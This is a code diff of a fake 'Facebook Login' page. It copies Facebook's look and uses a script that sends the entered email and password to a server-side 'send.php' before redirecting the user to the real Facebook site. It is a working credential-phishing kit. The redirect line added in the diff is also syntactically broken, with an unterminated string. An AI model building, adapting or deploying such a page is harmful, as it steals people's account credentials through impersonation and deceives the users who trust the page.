@@ -1,32 +1,86 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8">
   <title>Facebook Login</title>
-  <link rel="stylesheet" href="style.css">
-</head>
-<body>
+  <style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #e9ebee;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }.login-box {
+    background: white;
+    padding: 40px;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    width: 300px;
+}
 
-<div class="login-box">
+.login-box h1 {
+    color: #3b5998;
+    font-size: 36px;
+    text-align: center;
+    margin-bottom: 30px;
+}
+
+.login-box input[type="text"],
+.login-box input[type="password"] {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+}
+
+.login-box button {
+    width: 100%;
+    padding: 12px;
+    background-color: #3b5998;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.login-box button:hover {
+    background-color: #2d4373;
+}
+
+.login-box .links {
+    text-align: center;
+    margin-top: 20px;
+}
+
+.login-box .links a {
+    display: block;
+    color: #3b5998;
+    text-decoration: none;
+    margin: 8px 0;
+}
+
+.login-box .links a:hover {
+    text-decoration: underline;
+}
+
+  </style>
+</head>
+<body><div class="login-box">
   <h1>facebook</h1>
   <form id="loginForm">
     <input type="text" placeholder="Email or Phone" name="email" required>
     <input type="password" placeholder="Password" name="password" required>
-   
     <button type="submit">Log In</button>
-    
-   
     <div class="links">
       <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten Password?</a>
       <a href="https://www.facebook.com/r.php?entry_point=login">Create New Account</a>
     </div>
   </form>
-</div>
-
-<script>
+</div><script>
   document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
-
     const formData = new FormData(this);
 
     fetch('send.php', {
@@ -35,11 +89,9 @@
     })
     .then(res => res.text())
     .then(data => {
-      alert(data); // Optional: দেখানোর জন্য
-      window.location.href = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQ3NDAyMjkwLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'; // Redirect after sending
+      alert(data);
+      window.location.href = 'www.facebook.com;
     });
   });
-</script>
-
-</body>
+</script></body>
 </html>
